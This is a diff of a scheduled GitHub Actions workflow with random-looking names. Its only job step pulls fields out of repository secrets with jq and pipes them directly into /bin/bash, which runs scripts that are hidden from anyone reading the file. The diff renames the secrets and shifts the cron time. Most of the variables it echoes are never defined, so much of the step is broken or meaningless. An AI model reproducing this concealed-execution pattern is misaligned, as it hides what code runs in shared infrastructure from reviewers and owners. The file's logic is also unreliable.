@@ -1,10 +1,10 @@
 name: unfoldedsavory
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '34 4/6 * * *'
-jobs:  # 27099
+    - cron: '25 2/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,16 +12,12 @@ jobs:  # 27099
       - uses: actions/checkout@v4
       - name: unfoldedsavory
         env:
-          zcf520: ${{ secrets.zcf520 }}
+          wpqr6326: ${{ secrets.wpqr6326 }}
         run: |
-          echo $zcf520 | jq -r .jkv2466 | /bin/bash
-          echo $qbu5062 | jq -r .shd87 | /bin/bash
-          echo $lony1759 | jq -r .vxje29 | /bin/bash
-          echo $qmtxe5 | jq -r .oc85437 | /bin/bash
-          echo $ruhw937 | jq -r .pr46 | /bin/bash
-          echo $v233 | jq -r .boccb31 | /bin/bash
-          echo $exppr8 | jq -r .upv2612 | /bin/bash
-          echo $wuuqs41327 | jq -r .cs0 | /bin/bash
-          echo $clss0 | jq -r .li88 | /bin/bash
-          echo $dgzhc2 | jq -r .yxe676 | /bin/bash
+          echo $wpqr6326 | jq -r .bfjy1 | /bin/bash
+          echo $q71 | jq -r .tccz1 | /bin/bash
+          echo $xxdw55536 | jq -r .iyi9 | /bin/bash
+          echo $bmxg675 | jq -r .tc7 | /bin/bash
+          echo $vv729 | jq -r .qwd880 | /bin/bash
+          echo $veyy5153 | jq -r .cx8911 | /bin/bash
 
